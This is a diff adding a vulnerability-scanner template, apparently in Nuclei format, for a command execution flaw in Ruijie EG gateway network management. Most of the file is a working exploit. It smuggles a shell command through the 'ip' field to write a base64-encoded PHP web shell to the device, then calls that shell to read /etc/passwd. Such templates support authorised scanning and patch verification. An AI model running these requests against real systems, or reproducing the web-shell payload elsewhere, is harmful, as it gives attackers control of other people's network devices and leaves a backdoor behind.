@@ -1,0 +1,40 @@
+id: ruijie-networks-rce
+info:
+  name: Ruijie Networks-EWEB Network Management System RCE
+  author:
+  - l0ne1y
+  tags:
+  - ruijie
+  - rce
+  - network
+  description: "锐捷 EG易网关guestIsUp.php远程命令执行漏洞 \n锐捷网络是一家拥有包括交换机、路由器、软件、安全防火墙、无线产品、存储等全系列的网络设备产品线及解决方案的专业化网络厂商。\n\n锐捷网络股份有限公司NBR路由器EWEB网管系统存在命令执行漏洞，攻击者可利用该漏洞获取服务器控制权限。"
+  reference:
+  - https://github.com/yumusb/eggatewaygetshell_py/blob/main/eg.py
+  - https://www.ruijienetworks.com
+  severity: critical
+  remediation: |-
+    官方修复方案：
+    1.厂商已发布了漏洞修复程序，请及时关注更新：
+    https://www.ruijie.com.cn/
+requests:
+- matchers:
+  - type: regex
+    part: body
+    regex:
+    - 'root:.*:0:0:'
+    - 'nobody:x:0:0:'
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  raw:
+  - |
+    POST /guest_auth/guestIsUp.php HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+
+    ip=127.0.0.1|echo "PD9waHAKJGNtZD0kX0dFVFsnY21kJ107CnN5c3RlbSgkY21kKTsKPz4K"|base64 -d > poc.php&mac=00-00
+  - |
+    GET /guest_auth/poc.php?cmd=cat%20/etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded;charset=UTF-8
